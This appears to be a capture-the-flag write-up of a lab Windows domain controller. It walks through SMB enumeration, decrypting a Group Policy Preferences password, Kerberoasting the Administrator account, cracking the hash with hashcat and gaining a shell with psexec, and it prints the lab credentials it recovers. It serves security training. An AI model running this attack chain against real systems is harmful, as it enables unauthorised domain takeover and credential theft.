
![[active logo.png]]


nmap scan

```
nmap -sVC 10.129.23.181 -oN scan.txt
```

```
<SNIP>

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-02 10:50:00Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

<SNIP>
```

First i wanted to see if i could enumerate the smbshares, there is various tool like smbmap, smbclien, etc.. but i chose netcrackexec.

```
nxc smb "10.129.23.181" -u '' -p '' --shares
```

![Pasted image 20251202115741](Images/Pasted%20image%2020251202115741.png)

There is a uncommon share called "Replication" which i have READ permission on. 
I used smbclient to connect to the share

```
smbclient //10.129.23.181/Replication
```

After enumerating the share, i found a file **Groups.xml** which i tranfered to my machine.

![Pasted image 20251202120847](Images/Pasted%20image%2020251202120847.png)

After looking what's inside i found an encoded password, so i had to find a way to decrypt it.

![Pasted image 20251202120937](Images/Pasted%20image%2020251202120937.png)

After looking online, i found the tool **gpp-decrypt.py** which allowed me to get the plain text password with the user it belong to

![Pasted image 20251202121037](Images/Pasted%20image%2020251202121037.png)

```
SVC_TGS:GPPstillStandingStrong2k18
```
After testing the cred with **nxc**, it returned valid and i got a new share with read on

```
nxc smb "10.129.23.181" -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares
```

![Pasted image 20251202155928](Images/Pasted%20image%2020251202155928.png)

Let's connect to it
```
smbclient -U SVC_TGS //10.129.23.181/Users
```
![Pasted image 20251202160023](Images/Pasted%20image%2020251202160023.png)

I got the user.txt, so we have to find a way to get a privilege escalation.

First i used ldapsearch to see users of the domain

```
ldapsearch -H ldap://10.129.23.181 -x -b "DC=active,DC=htb" -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' | grep sAMAccountName
```
![Pasted image 20251202162019](Images/Pasted%20image%2020251202162019.png)

Next i wanted to see if some accounts had **servicePrincipalName** active

```
ldapsearch -H ldap://10.129.23.181 -x -b "DC=active,DC=htb" -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' | grep -B 2 servicePrincipalName
```
![Pasted image 20251202162153](Images/Pasted%20image%2020251202162153.png)

We can see that ServicePrincipalName is enable on administrator account.
We can now use GetUsersSPN.py in order to request a TGS for the administrator user and crack his hash to get it's password.

```
GetUserSPNs.py -dc-ip "10.129.23.181" "active.htb"/"svc_tgs:GPPstillStandingStrong2k18" -request
```
![Pasted image 20251202170403](Images/Pasted%20image%2020251202170403.png)

We export the hash into a txt file and we crack it using hashcat

```
echo '$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$a0e76088a<SNIP>72127d9bb3c' > hash.txt
```

```
hashcat hash.txt `fzf-wordlists`
```

```
Host memory required for this attack: 4 MB

Dictionary cache built:
* Filename..: /opt/lists/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 1 sec

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$a0e76088a9<SNIP>1d272127d9bb3c:Ticketmaster1968
```
So the password for the user administrator is **Ticketmaster1968**

We now use psexec.py to connect to the target and get the root flag

```
psexec.py "active.htb"/"administrator"@"10.129.23.181"
```
![Pasted image 20251202171400](Images/Pasted%20image%2020251202171400.png)

And we completed the challenge
